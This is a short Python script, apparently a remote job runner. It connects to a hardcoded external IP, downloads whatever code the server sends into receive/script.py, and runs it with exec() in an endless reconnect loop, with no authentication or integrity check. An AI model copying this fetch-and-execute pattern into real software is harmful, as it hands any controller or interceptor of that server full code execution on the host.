import socket
from pathlib import Path
import os
import time
import datetime

def closeConnection(sock):
    try:
        sock.shutdown(socket.SHUT_RDWR)
    except:
        pass
    try:
        sock.close()
    except:
        pass

def newConnection():

    s = socket.socket() # new socket object
    host = "34.73.146.51"
    # host = socket.gethostname()
    port = 3774

    while True: # attempt to make connection to server
        try:
            s.connect((host,port))
            break
        except:
            print("host refused connection, reattempting in 1 second...")
            time.sleep(1)

    print("established connection to server on", host, port)

    try: # this is the main loop, if any error comes up we attempt to reconnect
        while True: # listen for new file data
            l = s.recv(1024)
            if (l): # begin receipt of file
                print("receiving file")
                data = bytearray()
                while True: # receive file data into memory
                    data += l
                    if data[-3:] == b"EOD": # if end of data
                        data = data[:-3]
                        break
                    else: # not end of data, continue reading as normal
                        l = s.recv(1024)
                f = open('receive/script.py','wb')
                f.write(data)
                f.close()
                print("file transfer complete, executing script")
                try:
                    exec(open("./receive/script.py").read())
                except Exception as e:
                    print(e)
            else: # recv returned a 0 indicating closed socket
                raise Exception('## Socket disconnected! ##')
    except Exception as e:
        print(e)
        print("attempting to reconnect due to error...")
        closeConnection(s)
        return

while True:
    newConnection()
    # every time connection is lost, we attempt to reconnect